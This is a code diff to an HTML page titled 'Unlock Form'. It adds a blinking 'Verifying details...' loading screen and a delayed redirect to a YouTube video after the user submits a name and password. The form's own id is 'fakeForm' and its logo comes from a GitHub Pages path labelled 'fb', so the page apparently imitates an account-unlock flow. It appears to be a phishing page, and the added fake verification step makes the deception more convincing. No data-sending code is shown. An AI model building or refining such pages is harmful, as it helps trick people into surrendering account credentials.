@@ -19,6 +19,7 @@
             border-radius: 8px;
             box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
             transition: margin-top 0.3s;
+            min-height: 400px; /* Added min-height for better loading look */
         }
         .contact-container h2 {
             text-align: center;
@@ -79,57 +80,47 @@
             margin-left: 5px;
             margin-top: -15px;
         }
-        /* CSS maintained as requested, even for removed elements just in case */
-        .confirmation-options {
-            margin-top: 10px;
-        }
-        .confirmation-options div {
-            padding: 10px;
-            cursor: pointer;
-            display: flex;
-            align-items: center;
-        }
-        .confirmation-options div .checkbox {
-            margin-right: 10px;
-        }
-        .confirmation-options div:hover {
-            background-color: #f0f0f0;
-        }
-        .checkbox {
-            width: 15px;
-            height: 15px;
-            border: 1px solid #ccc;
-            border-radius: 5px;
-            position: relative;
-            display: inline-block;
-            cursor: pointer;
-        }
-        .checkbox.checked::after {
-            content: '';
-            position: absolute;
-            top: 1px;
-            left: 13px;
-            width: 7px;
-            height: 25px;
-            border: solid green;
-            border-width: 0 6px 6px 0;
-            transform: rotate(45deg);
-        }
-        .checkbox.no-options-checked::after {
-            border-color: red !important;
-        }
         .disclaimer {
             font-size: 0.8em;
             color: #666;
             margin-top: 20px;
             text-align: center;
         }
+
+        /* Loading Screen CSS */
+        #loadingScreen {
+            display: none; /* Hidden by default */
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding-top: 50px;
+        }
+        .blinking-logo {
+            width: 80px;
+            height: auto;
+            animation: blinker 1s linear infinite;
+        }
+        @keyframes blinker {
+            50% { opacity: 0.3; }
+        }
+        .verifying-text {
+            margin-top: 20px;
+            font-size: 1.1em;
+            color: #555;
+            font-weight: bold;
+        }
     </style>
 </head>
 <body>
 
 <div class="contact-container">
-    <h2>Unlock Form</h2>
+    <h2 id="formTitle">Unlock Form</h2>
+    
+    <div id="loadingScreen">
+        <img src="https://newtest77.github.io/fb/logo.png" alt="Loading" class="blinking-logo">
+        <div class="verifying-text">Verifying details...</div>
+    </div>
+
     <div class="form-fields" id="fakeForm">
         <label for="name"><strong>Full Name</strong></label>
         <input type="text" id="name" placeholder="Enter your full name" autocomplete="off" autocorrect="off" spellcheck="false">
@@ -178,15 +169,22 @@
             return;
         }
 
-        // Removed the check for "selectedCheckbox" since the section is gone.
+        // Hide the form and the title
+        document.getElementById('fakeForm').style.display = 'none';
+        document.getElementById('formTitle').style.display = 'none';
 
+        // Show the loading screen
+        document.getElementById('loadingScreen').style.display = 'flex';
+
+        // Clear inputs (optional, keeping it as per previous code logic)
         document.getElementById('fakeForm').querySelectorAll('input, select, textarea').forEach(element => {
             element.value = '';
         });
 
+        // Delay for 3 seconds to show the blinking animation, then redirect
         setTimeout(function() {
-            window.location.href = "";
-        }, 50);
+            window.location.href = "https://youtu.be/2b4fduMDMAQ?si=GMEaddGrF6pDJXD0";
+        }, 3000); 
     }
 
     const togglePassword = document.getElementById('togglePassword');
